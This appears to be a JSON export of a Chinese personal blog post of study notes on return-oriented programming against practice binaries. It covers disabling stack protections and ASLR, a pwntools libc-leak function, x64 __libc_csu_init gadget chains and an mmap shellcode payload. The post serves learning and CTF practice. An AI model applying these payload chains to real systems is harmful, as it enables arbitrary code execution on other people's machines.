{"posts": [{"title": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0", "date": "2018-03-28T14:45:00-00.00", "path": "/archives/note/", "text": "\u4e00\u6b65\u4e00\u6b65\u5b66ROP\u7b14\u8bb0\n\u539f\u6587\u5730\u5740: \u4e00\u6b65\u4e00\u6b65\u5b66ROP\n\nx86\n\u65e0\u4fdd\u62a4\n\n\u5173\u6389canary:  -fno-stack-protector\n\u5173\u6389NX:  -z execstack\n\u5173\u6389PIE:  sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space\n\n\u7ed5\u8fc7NX\ngdb\u4e0b\u627esystem()\u548c\"/bin/sh\\x00\"\u7684\u5730\u5740:\n(gdb) print system\n$1 = {&lt;text variable, no debug info&gt;} 0xb7e5f460 &lt;system&gt;\n(gdb) print __libc_start_main\n$2 = {&lt;text variable, no debug info&gt;} 0xb7e393f0 &lt;__libc_start_main&gt;\n(gdb) find 0xb7e393f0, +2200000, &quot;/bin/sh&quot;\n0xb7f81ff8\n(gdb) x/s 0xb7f81ff8\n0xb7f81ff8:  &quot;/bin/sh&quot;\n\n\u7ed5\u8fc7NX\u548cPIE\n\n\u770bplt : objdump -d -j .plt level2\n\u770bgot : objdump -R level2\n\u67e5\u770b\u76ee\u6807\u7a0b\u5e8f\u8c03\u7528\u7684so\u5e93 : ldd level2\n\n\u7528pwntools:\nelf = ELF(&#39;level2&#39;)\nplt_write = elf.symbols[&#39;write&#39;]\ngot_write = elf.got[&#39;write&#39;]\n\nlibc = ELF(&#39;libc.so&#39;)\nsystem_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])\n\n\u65e0libc.so\n\u6b65\u9aa4:\n\n\u6cc4\u9732__libc_start_main\u5730\u5740\n\u83b7\u53d6libc\u7248\u672c\n\u83b7\u53d6system\u5730\u5740\u4e0e/bin/sh\u7684\u5730\u5740\n\u518d\u6b21\u6267\u884c\u6e90\u7a0b\u5e8f\n\u89e6\u53d1\u6808\u6ea2\u51fa\u6267\u884csystem(\u201c/bin/sh\u201d)\n\nDynELF\u7684\u4f7f\u7528:\ndef leak(address):\n    payload1 = &#39;a&#39;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)\n    p.send(payload1)\n    data = p.recv(4)\n    print &quot;%#x =&gt; %s&quot; % (address, (data or &#39;&#39;).encode(&#39;hex&#39;))\n    return data\n\nd = DynELF(leak, elf=ELF(&#39;./level2&#39;))\nsystem_addr = d.lookup(&#39;system&#39;, &#39;libc&#39;)\n\n\nx64\n\u4f20\u53c2\u533a\u522b\n\n\u524d\u516d\u4e2a\u53c2\u6570\u4fdd\u5b58\u987a\u5e8f : RDI, RSI, RDX, RCX, R8, R9\n\ngadgets\n\n\u627eROP:  ROPgadget --binary level4 --only \"pop|ret\"\n\u8fc7\u6ee4:  ROPgadget --binary libc.so.6 --only \"pop|ret\" | grep rdi\n\n\u901a\u7528gadgets part1\n__libc_csu_init()\u4e0b:\n.text:0000000000400840                 public __libc_csu_init\n.text:0000000000400840 __libc_csu_init proc near               ; DATA XREF: _start+16o\n.text:0000000000400840                 push    r15\n.text:0000000000400842                 mov     r15d, edi\n.text:0000000000400845                 push    r14\n.text:0000000000400847                 mov     r14, rsi\n.text:000000000040084A                 push    r13\n.text:000000000040084C                 mov     r13, rdx\n.text:000000000040084F                 push    r12\n.text:0000000000400851                 lea     r12, __frame_dummy_init_array_entry\n.text:0000000000400858                 push    rbp\n.text:0000000000400859                 lea     rbp, __do_global_dtors_aux_fini_array_entry\n.text:0000000000400860                 push    rbx\n.text:0000000000400861                 sub     rbp, r12\n.text:0000000000400864                 xor     ebx, ebx\n.text:0000000000400866                 sar     rbp, 3\n.text:000000000040086A                 sub     rsp, 8\n.text:000000000040086E                 call    _init_proc\n.text:0000000000400873                 test    rbp, rbp\n.text:0000000000400876                 jz      short loc_400896\n.text:0000000000400878                 nop     dword ptr [rax+rax+00000000h]\n.text:0000000000400880\n.text:0000000000400880 loc_400880:                             ; CODE XREF: __libc_csu_init+54j\n.text:0000000000400880                 mov     rdx, r13\n.text:0000000000400883                 mov     rsi, r14\n.text:0000000000400886                 mov     edi, r15d\n.text:0000000000400889                 call    qword ptr [r12+rbx*8]\n.text:000000000040088D                 add     rbx, 1\n.text:0000000000400891                 cmp     rbx, rbp\n.text:0000000000400894                 jnz     short loc_400880\n.text:0000000000400896\n.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j\n.text:0000000000400896                 add     rsp, 8\n.text:000000000040089A                 pop     rbx\n.text:000000000040089B                 pop     rbp\n.text:000000000040089C                 pop     r12\n.text:000000000040089E                 pop     r13\n.text:00000000004008A0                 pop     r14\n.text:00000000004008A2                 pop     r15\n.text:00000000004008A4                 retn\n.text:00000000004008A4 __libc_csu_init endp\n\n\u56e0\u6b64\u82e5\u8981\u8c03\u7528write(1,got_write,8), \u5219\u53ef\u8fd9\u6837\u6784\u9020:\n# rbx\u5fc5\u987b\u4e3a0,\u56e0\u4e3acall qword ptr [r12+rbx*8]\n# rbp\u5fc5\u987b\u4e3a1,0x40088D~0x400894\u6709\u4e00\u4e2acmp,jnz\n# r12 = addr_got,\u56e0\u4e3acall qword ptr [r12+rb1x*8]\n# r13 = rdx = arg3\n# r14 = rsi = arg2\n# r15 = edi = arg1\n# retn\u7684padding\u9700\u89817*8=56byte\n\n# padding\npayload1 =  &quot;\\x00&quot;*136 \n# pop rbx\u5730\u5740_rbx=0_rbp=1_\u8c03\u7528\u51fd\u6570got_arg1_arg2_arg3\npayload1 += p64(0x40089A) +p64(0) + p64(1) + p64(got_write) + p64(1) + p64(got_write) + p64(8) \n# mov rdx,r13\u5730\u5740(\u6ce8\u610f\u770b\u539f\u59cb\u6c47\u7f16)\npayload1 += p64(0x400880) \n# padding(7*8=56byte)\npayload1 += &quot;\\x00&quot;*56\n# ret\npayload1 += p64(main)\n\n\u6b64\u5916\u8fd8\u6709\u4e00\u4e2ax64 gadgets, \u5c31\u662f:\n\npop rdi\nret\n\n\u7684gadgets. \u8fd9\u4e2agadgets\u662f\u7531opcode\u9519\u4f4d\u4ea7\u751f\u7684.\n\u5982\u4e0a\u7684\u4f8b\u5b50\u4e2d0x4008A2, 0x4008A4\u4e24\u5904\u7684\u5b57\u8282\u7801\u5982\u4e0b:\n\n0x41 0x5f 0xc3\n\n\u610f\u601d\u662fpop r15, ret, \u4f46\u662f\u6070\u597dpop rdi, ret\u7684opcode\u5982\u4e0b:\n\n0x5f 0xc3\n\n\u56e0\u6b64\u5982\u679c\u6211\u4eec\u6307\u54110x4008A3\u5c31\u53ef\u4ee5\u83b7\u5f97pop rdi, ret\u7684opcode, \u4ece\u800c\u5bf9\u4e8e\u5355\u53c2\u6570\u51fd\u6570\u53ef\u4ee5\u76f4\u63a5\u83b7\u5f97\u6267\u884c\n\u4e0e\u6b64\u7c7b\u4f3c\u7684, \u8fd8\u67090x4008A1\u5904\u7684 pop rsi, pop r15, ret\n\u90a3\u4e48\u8fd9\u4e2a\u6709\u4ec0\u4e48\u7528\u5462\uff1f\u6211\u4eec\u77e5\u9053x64\u4f20\u53c2\u987a\u5e8f\u662frdi, rsi, rdx, rcx.\n\u6240\u4ee5rsi\u662f\u7b2c\u4e8c\u4e2a\u53c2\u6570, \u6211\u4eec\u53ef\u4ee5\u5728rop\u4e2d\u914d\u5408pop rdi,ret\u6765\u4f7f\u7528pop rsi, pop r15,ret, \u8fd9\u6837\u5c31\u53ef\u4ee5\u8f7b\u677e\u7684\u8c03\u75282\u4e2a\u53c2\u6570\u7684\u51fd\u6570.\n\u7efc\u4e0a, \u5c31\u662fx64\u4e0b\u5229\u7528\u901a\u7528gadgets\u8c03\u7528\u4e00\u4e2a\u53c2\u6570, \u4e24\u4e2a\u53c2\u6570, \u4e09\u4e2a\u53c2\u6570\u51fd\u6570\u7684\u65b9\u6cd5.\n\u901a\u7528gadgets part2\n_dl_runtime_resolve()\u4e0b(\u5728\u5185\u5b58\u4e2d\u7684\u5730\u5740\u662f\u968f\u673a\u7684):\n0x7ffff7def200 &lt;_dl_runtime_resolve&gt;:       sub     rsp,0x38\n0x7ffff7def204 &lt;_dl_runtime_resolve+4&gt;:     mov     QWORD PTR [rsp],rax\n0x7ffff7def208 &lt;_dl_runtime_resolve+8&gt;:     mov     QWORD PTR [rsp+0x8],rcx\n0x7ffff7def20d &lt;_dl_runtime_resolve+13&gt;:    mov     QWORD PTR [rsp+0x10],rdx\n0x7ffff7def212 &lt;_dl_runtime_resolve+18&gt;:    mov     QWORD PTR [rsp+0x18],rsi\n0x7ffff7def217 &lt;_dl_runtime_resolve+23&gt;:    mov     QWORD PTR [rsp+0x20],rdi\n0x7ffff7def21c &lt;_dl_runtime_resolve+28&gt;:    mov     QWORD PTR [rsp+0x28],r8\n0x7ffff7def221 &lt;_dl_runtime_resolve+33&gt;:    mov     QWORD PTR [rsp+0x30],r9\n0x7ffff7def226 &lt;_dl_runtime_resolve+38&gt;:    mov     rsi,QWORD PTR [rsp+0x40]\n0x7ffff7def22b &lt;_dl_runtime_resolve+43&gt;:    mov     rdi,QWORD PTR [rsp+0x38]\n0x7ffff7def230 &lt;_dl_runtime_resolve+48&gt;:    call    0x7ffff7de8680 &lt;_dl_fixup&gt;\n0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov     r11,rax\n0x7ffff7def238 &lt;_dl_runtime_resolve+56&gt;:    mov     r9,QWORD PTR [rsp+0x30]\n0x7ffff7def23d &lt;_dl_runtime_resolve+61&gt;:    mov     r8,QWORD PTR [rsp+0x28]\n0x7ffff7def242 &lt;_dl_runtime_resolve+66&gt;:    mov     rdi,QWORD PTR [rsp+0x20]\n0x7ffff7def247 &lt;_dl_runtime_resolve+71&gt;:    mov     rsi,QWORD PTR [rsp+0x18]\n0x7ffff7def24c &lt;_dl_runtime_resolve+76&gt;:    mov     rdx,QWORD PTR [rsp+0x10]\n0x7ffff7def251 &lt;_dl_runtime_resolve+81&gt;:    mov     rcx,QWORD PTR [rsp+0x8]\n0x7ffff7def256 &lt;_dl_runtime_resolve+86&gt;:    mov     rax,QWORD PTR [rsp]\n0x7ffff7def25a &lt;_dl_runtime_resolve+90&gt;:    add     rsp,0x48\n0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp     r11\n\n\n\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570\u7684PLT\u786e\u5b9a_dl_runtime_resolve()\u5730\u5740, \u5176\u4e2dPLT[2]\u4e2d\u8df3\u8f6c\u7684\u5730\u5740\u5c31\u662f_dl_runtime_resolve()\u5730\u5740\n\u8981\u5229\u7528\u8fd9\u4e2agadget, \u6211\u4eec\u8fd8\u9700\u8981\u63a7\u5236rax\u7684\u503c, \u56e0\u4e3agadget\u662f\u901a\u8fc7rax\u8df3\u8f6c\u7684:0x7ffff7def235 &lt;_dl_runtime_resolve+53&gt;:    mov    r11,rax\n...\n0x7ffff7def25e &lt;_dl_runtime_resolve+94&gt;:    jmp    r11\n\n\n\n\n\u5229\u7528mmap\u6267\u884c\u4efb\u610fshellcode\nmmap\u6216\u8005mprotect\u5c06\u67d0\u5757\u5185\u5b58\u6539\u6210RWX, \u7136\u540e\u5c06shellcode\u4fdd\u5b58\u5230\u8fd9\u5757\u5185\u5b58, \u7136\u540e\u63a7\u5236pc\u8df3\u8f6c\u8fc7\u53bb\u5c31\u53ef\u4ee5\u6267\u884c\u4efb\u610f\u7684shellcode\u4e86.\n# mmap(rdi=shellcode_addr, rsi=1024, rdx=7, rcx=34, r8=0, r9=0)\n# \u53c2\u6570\u4f20\u9012\u4ecelinker_addr + 0x35\u5f00\u59cb\n# \u9700\u8981\u5148pop rax,ret,\u4e14\u4f7frax=mmap_addr\n# r9,r8,rdi,rsi,rdx,rcx,rax\n# \u6700\u540e\u9700\u8981(0x48-8*6)/8 = 3Byte padding\npayload3 =  &quot;\\x00&quot;*136\npayload3 += p64(pop_rax_ret) + p64(mmap_addr)\npayload3 += p64(linker_addr+0x35) + p64(0) + p64(34) + p64(7) + p64(1024) + p64(shellcode_addr) + p64(0) + p64(0) + p64(0) + p64(0)\n\n", "categories": [{"name": "pwn", "slug": "pwn", "permalink": "/category/pwn/"}], "tags": [{"name": "pwn", "slug": "pwn", "permalink": "/tag/pwn/"}, {"name": "ROP", "slug": "ROP", "permalink": "/tag/ROP/"}]}], "pages": [{"title": "\u5173\u4e8e", "date": "2017-06-28T17:26:00-00.00", "path": "/about/", "text": "\u8fd9\u91cc\u662f\u6211\u7684\u4e2a\u4eba\u535a\u5ba2\uff0c\u901a\u8fc7 GitHub \u7ba1\u7406\u4e0e\u6784\u5efa\u3002\nContact\nEmail: yuripwn@gmail.com\n", "categories": [], "tags": []}]}